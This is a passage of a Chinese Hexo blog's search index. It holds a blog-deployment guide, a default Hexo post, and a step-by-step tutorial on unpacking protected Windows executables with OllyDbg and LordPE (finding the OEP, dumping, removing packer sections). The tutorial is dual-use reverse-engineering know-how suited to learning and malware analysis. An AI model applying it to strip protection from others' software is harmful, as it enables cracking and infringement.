[{"title":"博客的搭建教程","url":"/2022/02/10/boke/","content":"<p>点击文章标题进入阅读模式！</p>\n<p>前言：<br>很荣幸这是我的第一篇私人博客，所以在我想些要准备用博客来干些什么，写些什么的时候，我决定先和大家分享一下我的私人博客是如何建立的，这也算个不错的优良记录和备份的习惯。</p>\n<p>大家如果有任何觉得我写的的不好的地方欢迎指出改进。可以再b站私信我</p>\n<p>链接<span class=\"exturl\"><a class=\"exturl__link\" href=\"https://space.bilibili.com/2098810443\">欢迎大家关注我的Bilibli</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span><br><img src=\"/2022/02/10/boke/bk1.png\" alt=\"思维导图\"></p>\n<p>创建一个文件夹blog，这里面将放入你的博客文件</p>\n\n        <h1 id=\"环境搭建：\">\n          <a href=\"#环境搭建：\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#环境搭建：\" class=\"headerlink\" title=\"环境搭建：\"></a>环境搭建：</h1>\n      <ol>\n<li>node.js<br>浏览器上搜索node.is去官网点击下载安装包(.msi),根据自己的需求，我这里选择的是windows64位</li>\n<li>git<br>去git官网点击Download for Windows我选择的是64-bit Git for Windows Setup.</li>\n<li>hexo<br>在blog文件目录下鼠标右键打开Git Bash Here<br>执行：npm config set registry <span class=\"exturl\"><a class=\"exturl__link\" href=\"http://registry.npm.taobao.org/\">http://registry.npm.taobao.org</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span><br>执行：npm install hexo-cli -g</li>\n</ol>\n\n        <h1 id=\"生成博客文件：\">\n          <a href=\"#生成博客文件：\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#生成博客文件：\" class=\"headerlink\" title=\"生成博客文件：\"></a>生成博客文件：</h1>\n      <p>  执行：hexo init</p>\n\n        <h1 id=\"预览博客文件：\">\n          <a href=\"#预览博客文件：\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#预览博客文件：\" class=\"headerlink\" title=\"预览博客文件：\"></a>预览博客文件：</h1>\n      <p>  执行：hexo s<br>  此时可以复制搜索输出的网址，即可预览到自己的博客网页。<br>  Ctrl+c</p>\n\n        <h1 id=\"部署到码云-gitee-平台：\">\n          <a href=\"#部署到码云-gitee-平台：\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#部署到码云-gitee-平台：\" class=\"headerlink\" title=\"部署到码云(gitee)平台：\"></a>部署到码云(gitee)平台：</h1>\n      <p>  首先到gitee网页点击右上角的加号，新建库，名字最好以自己的账户名命名，分支选择master,点击创建。<br>  复制网页上这一条网址：在很显眼的位置，点击红色我框住的地方即可直接复制。<br> <img src=\"/2022/02/10/boke/bk2.png\" alt=\"图片\"><br>在blog文件夹下找到_config.yml文件，用记事本打开，找到最下方这个位置。<br>在type:’’的单引号中输入git<br>换行，空格，输入repo:空一格，粘贴上面复制的文件<br>换行，输入branch: master<br> <img src=\"/2022/02/10/boke/bk3.png\" alt=\"图片\"></p>\n\n        <h2 id=\"安装部署工具：npm-install-hexo-deployer-git-–save\">\n          <a href=\"#安装部署工具：npm-install-hexo-deployer-git-–save\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#安装部署工具：npm-install-hexo-deployer-git-–save\" class=\"headerlink\" title=\"安装部署工具：npm install hexo-deployer-git –save\"></a>安装部署工具：npm install hexo-deployer-git –save</h2>\n      \n        <h2 id=\"生成静态文件：hexo-g\">\n          <a href=\"#生成静态文件：hexo-g\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#生成静态文件：hexo-g\" class=\"headerlink\" title=\"生成静态文件：hexo g\"></a>生成静态文件：hexo g</h2>\n      \n        <h3 id=\"部署：hexo-d\">\n          <a href=\"#部署：hexo-d\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#部署：hexo-d\" class=\"headerlink\" title=\"部署：hexo d\"></a>部署：hexo d</h3>\n      <p>  这时出现了用户需要用户的登录提示，否则会部署不成功会出现下面的这种情况：<br> <img src=\"/2022/02/10/boke/bk4.png\" alt=\"图片\"><br>  执行：git config –global user.name “你的用户名”<br>  执行：git config -global user.email “你的邮箱”<br>  然后就会弹出Windows安全中心的登录提示：这时候只需要输入你注册gitee时的邮箱，登录gitee的密码即可<br>  执行：hexo d<br>  这里其实部署的就是在blog文件下的public下的所有文件夹到远端分支<br>Gitee Pages 服务：<br>  在网页部署的文件页面下，点击服务，点击gitee pages,这里要上传个人实名认证，一天通过后，就可以直接点击开启服务，稍等后出现一个网址，点击该网址，也可以跳转到我们的博客网页，但是在这里我遇到的问题就是打开后，只有文本字符，没有任何的图形界面。</p>\n<p>  所以我又找到了SCDN的一位大佬：可可与鱼<br>  <span class=\"exturl\"><a class=\"exturl__link\" href=\"https://blog.csdn.net/qq_40157728/article/details/114327987?ops_request_misc=&request_id=&biz_id=102&utm_term=Github%20pages%20%E6%8A%A5%E9%94%99404%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80_Keyu_lo&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-114327987.142%5Ev10%5Epc_search_result_control_group,157%5Ev4%5Econtrol&spm=1018.2226.3001.4187\">大佬传送门</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span></p>\n<p>  所以我把权限改成了开源，而且github云端建立存放网页的repository时，命名为自己的gitee ID(例如：ID为xxx，则repository name 为xxx.gitee.io)。所以我就是把ID改了，改成和gitee.io前面的xxx一样的内容。这样再点击更新的网址连接图形界面就出来了。</p>\n<p><span class=\"exturl\"><a class=\"exturl__link\" href=\"https://zhuanlan.zhihu.com/p/370635512\">2023.5.1更新-知乎上github的部署方式</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span>—–由于gitee好像不行了</p>\n\n        <h1 id=\"更换主题：\">\n          <a href=\"#更换主题：\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#更换主题：\" class=\"headerlink\" title=\"更换主题：\"></a>更换主题：</h1>\n      <p>  我们可以直接搜索hexo 主题<br>  我们这里使用的是一个github上的主题：(GitHub - liuyib&#x2F;hexo-theme-stun: 🦄 An elegant theme for Hexo)<br>  在blog文件下的themes文件右键打开git bash here,<br>  执行：git clone GitHub - liuyib&#x2F;hexo-theme-stun: 🦄 An elegant theme for Hexo<br>  就把主题下载进来了，然后我们就要修改配置，还是文本打开_config.yml<br>  找到：<br> <img src=\"/2022/02/10/boke/bk5.png\" alt=\"图片\"><br>把theme: 后面修改成刚才下载的主题文件夹名称<br>安装依赖：npm install –save hexo-renderer-pug<br>预览新主题：hexo s<br>生成新静态文件：hexo g<br>重新部署：hexo d<br>更新gitee pages服务<br>  至此呢我们的个人博客差不多就算是搭建好了。<br><span class=\"exturl\"><a class=\"exturl__link\" href=\"https://theme-stun.github.io/docs/zh-CN/guide/primary.html#%E6%B7%BB%E5%8A%A0%E6%96%B0%E9%A1%B5%E9%9D%A2\">官方主题设置信息</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span></p>\n<figure class=\"highlight plaintext\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo new post [新建一篇文章的标题]</span><br></pre></td></tr></table></div></figure>","categories":["博客搭建","博客的搭建教程"],"tags":["博客搭建","博客的搭建教程"]},{"title":"Hello World","url":"/2023/04/22/hello-world/","content":"<img src=\"https://ghchart.rshah.org/409ba5/unique-Elven\" alt=\"unqique-Elven's Blue Github Chart\">\n\n<p>Welcome to <span class=\"exturl\"><a class=\"exturl__link\" href=\"https://hexo.io/\">Hexo</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span>! This is your very first post. Check <span class=\"exturl\"><a class=\"exturl__link\" href=\"https://hexo.io/docs/\">documentation</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\"><a class=\"exturl__link\" href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span> or you can ask me on <span class=\"exturl\"><a class=\"exturl__link\" href=\"https://github.com/hexojs/hexo/issues\">GitHub</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span>.</p>\n\n        <h2 id=\"Quick-Start\">\n          <a href=\"#Quick-Start\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2>\n      \n        <h3 id=\"Create-a-new-post\">\n          <a href=\"#Create-a-new-post\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3>\n      <figure class=\"highlight bash\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></div></figure>\n\n<p>More info: <span class=\"exturl\"><a class=\"exturl__link\" href=\"https://hexo.io/docs/writing.html\">Writing</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span></p>\n\n        <h3 id=\"Run-server\">\n          <a href=\"#Run-server\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3>\n      <figure class=\"highlight bash\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></div></figure>\n\n<p>More info: <span class=\"exturl\"><a class=\"exturl__link\" href=\"https://hexo.io/docs/server.html\">Server</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span></p>\n\n        <h3 id=\"Generate-static-files\">\n          <a href=\"#Generate-static-files\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3>\n      <figure class=\"highlight bash\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></div></figure>\n\n<p>More info: <span class=\"exturl\"><a class=\"exturl__link\" href=\"https://hexo.io/docs/generating.html\">Generating</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span></p>\n\n        <h3 id=\"Deploy-to-remote-sites\">\n          <a href=\"#Deploy-to-remote-sites\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3>\n      <figure class=\"highlight bash\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></div></figure>\n\n<p>More info: <span class=\"exturl\"><a class=\"exturl__link\" href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span></p>\n","categories":["博客搭建","hello-world"],"tags":["博客搭建","hello-world"]},{"title":"程序脱壳篇","url":"/2023/04/22/ketu/","content":"<p>点击文章标题进入阅读模式！</p>\n<p>尊重知识产权，引用注明出处！谢谢合作！<br>有问题请在B站私信！<br>链接<span class=\"exturl\"><a class=\"exturl__link\" href=\"https://space.bilibili.com/2098810443\">欢迎大家关注我的Bilibli</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span><br>感谢一键三连哦~</p>\n\n        <h1 id=\"一·-什么是壳？\">\n          <a href=\"#一·-什么是壳？\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#一·-什么是壳？\" class=\"headerlink\" title=\"一· 什么是壳？\"></a>一· 什么是壳？</h1>\n      \n        <h2 id=\"1-初步认识壳\">\n          <a href=\"#1-初步认识壳\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#1-初步认识壳\" class=\"headerlink\" title=\"1 . 初步认识壳\"></a>1 . 初步认识壳</h2>\n      <p>历史：壳是最早出现的专用加密软件技术！</p>\n<p>作用：可以是开发者未来保护自己的代码不被借鉴、破解、逆向；也可用来病毒、木马、蠕虫隐藏恶意代码，不被杀毒如软件查杀！</p>\n<p>预习：vmp纯虚拟机壳，目前公认认为公认最强。</p>\n<p>温馨提示：脱壳上瘾，可不要随意传播哦!</p>\n\n        <h2 id=\"2-壳的执行过程\">\n          <a href=\"#2-壳的执行过程\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#2-壳的执行过程\" class=\"headerlink\" title=\"2 . 壳的执行过程\"></a>2 . 壳的执行过程</h2>\n      <p>加壳压缩，壳先执行，还原源程序，执行源程序</p>\n\n        <h2 id=\"3-OEP-Original-Entry-Point\">\n          <a href=\"#3-OEP-Original-Entry-Point\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#3-OEP-Original-Entry-Point\" class=\"headerlink\" title=\"3 . OEP(Original Entry Point)\"></a>3 . OEP(Original Entry Point)</h2>\n      \n        <h3 id=\"1·EP-Entry-Point\">\n          <a href=\"#1·EP-Entry-Point\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#1·EP-Entry-Point\" class=\"headerlink\" title=\"1·EP(Entry Point)\"></a>1·EP(Entry Point)</h3>\n      <p>EP(Entry Point)，意即程序的入口点。而OEP是程序的原始入口点，一个正常的程序只有EP，</p>\n<p>例如：C语言main函数、winAPI函数、VC编译的入口地址0x40000000</p>\n<p>只有入口点被修改的程序(加壳等)，才会拥有OEP。</p>\n\n        <h3 id=\"2·OEP\">\n          <a href=\"#2·OEP\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#2·OEP\" class=\"headerlink\" title=\"2·OEP\"></a>2·OEP</h3>\n      <p>OEP：(Original Entry Point)，程序的原始<span class=\"exturl\"><a class=\"exturl__link\" href=\"https://baike.baidu.com/item/%E5%85%A5%E5%8F%A3%E7%82%B9\">入口点</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span>，软件加壳就是隐藏了EP， 只要我们找到程序的OEP，就可以立刻脱壳。</p>\n<p> <span class=\"exturl\"><a class=\"exturl__link\" href=\"https://baike.baidu.com/item/PUSHAD\">PUSHAD</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span> （压栈） 代表程序的入口点，<span class=\"exturl\"><a class=\"exturl__link\" href=\"https://baike.baidu.com/item/POPAD\">POPAD</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span> （出栈） 代表程序的出口点，与PUSHAD相对应，一般找到这个OEP就在附近啦。</p>\n\n        <h2 id=\"4-壳的装载过程\">\n          <a href=\"#4-壳的装载过程\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#4-壳的装载过程\" class=\"headerlink\" title=\"4 . 壳的装载过程\"></a>4 . 壳的装载过程</h2>\n      <p>模拟windows加载器：</p>\n<p>壳获取自己所需要使用的API地址、解压或解密源程序的各个区块、进行必要的重定位、跳转到程序原入口点（OPE）</p>\n\n        <h2 id=\"5-压缩引擎\">\n          <a href=\"#5-压缩引擎\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#5-压缩引擎\" class=\"headerlink\" title=\"5 . 压缩引擎\"></a>5 . 压缩引擎</h2>\n      \n        <h3 id=\"1·aPLib\">\n          <a href=\"#1·aPLib\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#1·aPLib\" class=\"headerlink\" title=\"1·aPLib\"></a>1·aPLib</h3>\n      <ul>\n<li><span class=\"exturl\"><a class=\"exturl__link\" href=\"http://www.ibsensoftware.com/\">aPLib</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span></li>\n</ul>\n<p>低于64kb的文件压缩速度较快</p>\n\n        <h3 id=\"2·JCALG1\">\n          <a href=\"#2·JCALG1\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#2·JCALG1\" class=\"headerlink\" title=\"2·JCALG1\"></a>2·JCALG1</h3>\n      <ul>\n<li><span class=\"exturl\"><a class=\"exturl__link\" href=\"http://www.bitsum.com/other\">JCALG1</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span></li>\n</ul>\n<p>对大文件效果较好</p>\n\n        <h3 id=\"3·LZMA\">\n          <a href=\"#3·LZMA\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#3·LZMA\" class=\"headerlink\" title=\"3·LZMA\"></a>3·LZMA</h3>\n      <ul>\n<li><span class=\"exturl\"><a class=\"exturl__link\" href=\"http://www.7-zip.org/zh-cn/adk.html\">LZMA</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span></li>\n</ul>\n<p>使用目的：开源，稳定</p>\n<p>特点：保证压缩比的情况下解压速度一定要快</p>\n\n        <h2 id=\"6-壳的分类\">\n          <a href=\"#6-壳的分类\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#6-壳的分类\" class=\"headerlink\" title=\"6 . 壳的分类\"></a>6 . 壳的分类</h2>\n      \n        <h3 id=\"1·压缩壳\">\n          <a href=\"#1·压缩壳\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#1·压缩壳\" class=\"headerlink\" title=\"1·压缩壳\"></a>1·压缩壳</h3>\n      <ul>\n<li>ASPack</li>\n<li>UPX</li>\n<li>PECompact</li>\n</ul>\n\n        <h3 id=\"2·加密壳\">\n          <a href=\"#2·加密壳\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#2·加密壳\" class=\"headerlink\" title=\"2·加密壳\"></a>2·加密壳</h3>\n      <ul>\n<li>ASProtect</li>\n<li>Armadillo</li>\n<li>EXECryptor</li>\n<li>Themida</li>\n<li>VMProtect 缺点慢</li>\n</ul>\n<hr>\n\n        <h1 id=\"二·-实践是检验真理的唯一标准\">\n          <a href=\"#二·-实践是检验真理的唯一标准\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#二·-实践是检验真理的唯一标准\" class=\"headerlink\" title=\"二· 实践是检验真理的唯一标准\"></a>二· 实践是检验真理的唯一标准</h1>\n      <p>接下来我们尝试破解这样一个老程序壳：<img src=\"/2023/04/22/ketu/p1.png\" alt=\"image\"></p>\n\n        <h2 id=\"1-查看壳\">\n          <a href=\"#1-查看壳\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#1-查看壳\" class=\"headerlink\" title=\"1 . 查看壳\"></a>1 . 查看壳</h2>\n      \n        <h3 id=\"1·PEiD查看\">\n          <a href=\"#1·PEiD查看\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#1·PEiD查看\" class=\"headerlink\" title=\"1·PEiD查看\"></a>1·PEiD查看</h3>\n      <p><img src=\"/2023/04/22/ketu/p2.png\" alt=\"image-20220413\"></p>\n\n        <h3 id=\"2·Exeinfo-PE查看\">\n          <a href=\"#2·Exeinfo-PE查看\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#2·Exeinfo-PE查看\" class=\"headerlink\" title=\"2·Exeinfo PE查看\"></a>2·Exeinfo PE查看</h3>\n      <p><img src=\"/2023/04/22/ketu/p3.png\" alt=\"image-20220413\"></p>\n<p>咳咳咳，咋就是说，这找不到这个程序壳的特征码，咋们看不出什么来，试试别的，是个老古董壳！</p>\n\n        <h3 id=\"3·脱壳后的程序查看\">\n          <a href=\"#3·脱壳后的程序查看\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#3·脱壳后的程序查看\" class=\"headerlink\" title=\"3·脱壳后的程序查看\"></a>3·脱壳后的程序查看</h3>\n      <p><img src=\"/2023/04/22/ketu/p4.png\" alt=\"image\"></p>\n<p>可见它是由VC5.0编译的程序！</p>\n<p><img src=\"/2023/04/22/ketu/p5.png\" alt=\"image-20220413\"></p>\n<p>可见无壳！</p>\n\n        <h2 id=\"2-OD脱壳\">\n          <a href=\"#2-OD脱壳\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#2-OD脱壳\" class=\"headerlink\" title=\"2 . OD脱壳\"></a>2 . OD脱壳</h2>\n      <p>用od把程序打开，刚进来情况是这样的：</p>\n<p><img src=\"/2023/04/22/ketu/p6.png\" alt=\"image-20220413\"></p>\n<p>刚进来的时候是要提示是壳的EP，如果不是，要在选项&#x2F;调制选项&#x2F;事件中设置第一次暂停于主模块入口：</p>\n<p><img src=\"/2023/04/22/ketu/p7.png\" alt=\"image-20220413\"></p>\n<p>点击OD里面的M查看进程内存：</p>\n<p><img src=\"/2023/04/22/ketu/p8.png\" alt=\"image-20220413\"></p>\n<p>试着分析对比，可见代码的入口地址是0x00401000，按C回到查看汇编代码，我们现在的入口地址是0x46B6DE，可见它在包含SFX的地址0x46B00000中。这壳有这三个区块（资源、SFX、重定向）。.text段就是程序的代码段块！</p>\n<p>接下来单步执行F8，到jmp的时候跳转到地址0x004271B0:</p>\n<p><img src=\"/2023/04/22/ketu/p9.png\" alt=\"image\"></p>\n<p>来到这大概这个样子，右键分析&#x2F;分分析代码：</p>\n<p><img src=\"/2023/04/22/ketu/p10.png\" alt=\"image\"></p>\n<p>再看进程内存，可知0x004271B0是在包含代码地址0x00401000中，所以它开头是55&#x2F;8BEC，我们就找到了OEP</p>\n<p>在OD的plugin文件夹中加入插件重新打开：</p>\n<p><img src=\"/2023/04/22/ketu/p11.png\" alt=\"image\"></p>\n<p>右键选择插件dump debugged process把程序dump出来</p>\n<p>如下设置：</p>\n<p><img src=\"/2023/04/22/ketu/p12.png\" alt=\"image\"></p>\n<p>确保勾选Fix Raw Size是修复壳进行的数据偏移，不勾选Rebuil lmport输入表不进行重定位！</p>\n<p>点击dump，保存文件命名dumo1，回到上面脱壳后的查看！</p>\n\n        <h2 id=\"3-删除壳，减小程序大小\">\n          <a href=\"#3-删除壳，减小程序大小\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#3-删除壳，减小程序大小\" class=\"headerlink\" title=\"3 . 删除壳，减小程序大小\"></a>3 . 删除壳，减小程序大小</h2>\n      <p>目前查看dump1.exe文件属性&#x2F;大小：</p>\n<p><img src=\"/2023/04/22/ketu/p13.png\" alt=\"image\"></p>\n<p>打开软件lordPE，然后点击PE Editor按钮，选择dump1，对照弹出窗口里面显示的出数据和OD里的进程内存对比，然后点击Sections按钮，发现多余的壳区块，通通右键选择wipe section header, 如果是灰色的，那么请确保程序先不处于运行状态。后点击Save按钮保存OK。</p>\n<p><img src=\"/2023/04/22/ketu/p14.png\" alt=\"image-20220413224740751\"></p>\n<p>最后点击Rebuild PE再选择dump1打开：</p>\n<p><img src=\"/2023/04/22/ketu/p15.png\" alt=\"image-20220413224850649\"></p>\n<p>咋就知道，程序大小最后变成了原本91%！</p>\n<p><img src=\"/2023/04/22/ketu/p16.png\" alt=\"image-20220413225205230\"></p>\n<p>此时再用OD打开就发现壳已经无了：</p>\n<p><img src=\"/2023/04/22/ketu/p17.png\" alt=\"image-20220413225131666\"></p>\n\n        <h2 id=\"4-根据堆栈平衡原理寻找OEP\">\n          <a href=\"#4-根据堆栈平衡原理寻找OEP\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#4-根据堆栈平衡原理寻找OEP\" class=\"headerlink\" title=\"4 . 根据堆栈平衡原理寻找OEP\"></a>4 . 根据堆栈平衡原理寻找OEP</h2>\n      \n        <h3 id=\"1·示例：zip压缩壳\">\n          <a href=\"#1·示例：zip压缩壳\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#1·示例：zip压缩壳\" class=\"headerlink\" title=\"1·示例：zip压缩壳\"></a>1·示例：zip压缩壳</h3>\n      <p>实例：看文件名可猜测这是一个压缩壳</p>\n<p><img src=\"/2023/04/22/ketu/p18.png\" alt=\"image-20220414144957058\"></p>\n<p>用OD打开，发现刚进来第一句就是一堆跳转之中的一个jmp:</p>\n<p><img src=\"/2023/04/22/ketu/p19.png\" alt=\"image-20220414145244971\"></p>\n<p>这里就是壳的模块入口了，F8执行，可见这格式像是VC程序的入口点：</p>\n<p><img src=\"/2023/04/22/ketu/p20.png\" alt=\"image-20220414182834762\"></p>\n<p>可是这并不是OEP，这是为什么呢？原因我们来到进程内存来看：</p>\n<p><img src=\"/2023/04/22/ketu/p21.png\" alt=\"image-20220414183146139\"></p>\n<p>程序目前运行地址在0x004682BC，这大概在进程内存的0x00465000到0x0046A000之间，并不是我们所想的在0x401000里面，所以它其实是一个伪造程序区块OEP的壳！</p>\n<p>现在我们重新打开，从最开始就要注意观察ESP寄存器的变化：</p>\n<p>刚开始是0012FFC4，当运行到<img src=\"/2023/04/22/ketu/p22.png\" alt=\"image-20220414191517674\"></p>\n<p>时ESP发生第一次变化，变成0012FFC0，我们要把鼠标放在ESP显示的数据上右键选择数据窗口中跟随：</p>\n<p><img src=\"/2023/04/22/ketu/p23.png\" alt=\"image-20220414212857900\"></p>\n<p>然后就可以在数窗口看到0012FFC0，这是ESP所在的内存的位置，在该位置右键&#x2F;断点&#x2F;硬件访问&#x2F;word都可以：</p>\n<p><img src=\"/2023/04/22/ketu/p24.png\" alt=\"image-20220414213357003\"></p>\n<p>此时就设置好了硬件断点，此断点不一般，只能在&#x2F;调试&#x2F;硬件断点&#x2F;查看到哦，也可在此修改，也可以看到一般它只有四个硬件断点，使用的CPU特殊寄存器下断：</p>\n<p><img src=\"/2023/04/22/ketu/p25.png\" alt=\"image-20220414213713220\"></p>\n<p>F9直接运行到断点的位置<img src=\"/2023/04/22/ketu/p26.png\" alt=\"image-20220415101819043\"></p>\n<p>此时ESP的值是0012FFC4，刚好是刚才断点的位置！</p>\n<p>这里可以记录一下，一般大部分的壳出现jmp eax都是跳转到OEP，但是这会出现一个明显的分界点，所以现在一些的强壳不会这样做！</p>\n<p>可以看到EAX的值是004271B0，我们继续看到进程内存，它在0x00401000到0x0044B000之间的代码区块！</p>\n<p>然后F8就进到了OEP:<img src=\"/2023/04/22/ketu/p27.png\" alt=\"image-20220415112909192\"></p>\n<p>此时就可以删除硬件断点，并进行dump操作！</p>\n<p>也是先不勾选重定向，然后保存dump2!</p>\n<p>此时打开lordPE，点击PE Editor按钮，选择dump2打开：</p>\n<p><img src=\"/2023/04/22/ketu/p28.png\" alt=\"image-20220415185618813\"></p>\n<p>先点击Sections按钮把壳的区块删除。然后可以看到ImageBase:00040000正确。但是代码段的偏移Base0fCode:00065000指向的还是伪装壳的代码段，所以我们要把他修改偏移成1000，Base0fData:改成4B000。，Save，OK保存！<img src=\"/2023/04/22/ketu/p29.png\" alt=\"image-20220415201035557\"></p>\n<p>会发现它脱完壳之后竟然变大了原来的85%，因为这是压缩壳！</p>\n<p>接下来就可以根据retn所指向链接的黑线找到该区块的入口：<img src=\"/2023/04/22/ketu/p30.png\" alt=\"image-20220415223054110\"></p>\n<p>根据这个内存地址和连接指向的红线我们可以再往上寻找，发现就是回到了我们刚进来的一堆jmp的地方：<img src=\"/2023/04/22/ketu/p31.png\" alt=\"image-20220415223502317\"></p>\n<p>也就是这样通过一连串的代码块的跳转对文件不同区块的压缩和加密！</p>\n\n        <h3 id=\"2·作业\">\n          <a href=\"#2·作业\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#2·作业\" class=\"headerlink\" title=\"2·作业\"></a>2·作业</h3>\n      \n        <h4 id=\"1-eXPressor壳\">\n          <a href=\"#1-eXPressor壳\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#1-eXPressor壳\" class=\"headerlink\" title=\"1.eXPressor壳\"></a>1.eXPressor壳</h4>\n      <p>程序：<img src=\"/2023/04/22/ketu/p32.png\" alt=\"image-20220416103816878\"></p>\n<p>查看PEiD:<img src=\"/2023/04/22/ketu/p33.png\" alt=\"image-20220416103859136\"></p>\n<p>可见这是一个exPressor的壳！</p>\n<p>OD打开程序，刚进来就在这个地址：<img src=\"/2023/04/22/ketu/p34.png\" alt=\"image-20220416104054028\"></p>\n<p>点击M查看进程内存：<img src=\"/2023/04/22/ketu/p35.png\" alt=\"image-20220416104212052\"></p>\n<p>根据经验，程序本来的.text代码块被壳包含在了0x0046B000开始的区段，达到了“壳里有肉，肉里有壳”的效果！</p>\n<p>根据堆栈平衡原理(80%有效)找到OEP，这次进行dump操作的时候，一点要勾选上重定向输入表！<img src=\"/2023/04/22/ketu/p36.png\" alt=\"image-20220416104837596\"></p>\n<p>这样插件就会搜索重建输入表，搜索里面的jmp跳转到一些API，然后再把这些API依次组成一个输入表！保存为dump3</p>\n<p>再用PEiD查看dump3.exe的时候，就原型毕露了，知道它是VC++5.0写的一个程序！</p>\n<p>再用OD打开dump3.exe点击M查看进程内存：</p>\n<p><img src=\"/2023/04/22/ketu/p37.png\" alt=\"image-20220416105442548\"></p>\n<p>发现它多了一个输入表！</p>\n<p>我们在进行LordPE的时候修改偏移Base0fcode的时候，首先要看到dump3程序入口点地址：<img src=\"/2023/04/22/ketu/p38.png\" alt=\"image-20220416105855396\"></p>\n<p>对比上面的进程内存，可见他在0x401000开始的区段，所以Base0fcode要修改成1000！Save</p>\n<p>在删除多余的区块的时候，备份一份，尝试后发现，只有.ex_cod可以wipe掉！<img src=\"/2023/04/22/ketu/p39.png\" alt=\"image-20220416110735593\"></p>\n<p>最后Rebuild PE选择dump3!<img src=\"/2023/04/22/ketu/p40.png\" alt=\"image-20220416111201710\"></p>\n<p>完成！</p>\n\n        <h4 id=\"2-MEW压缩壳\">\n          <a href=\"#2-MEW压缩壳\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#2-MEW压缩壳\" class=\"headerlink\" 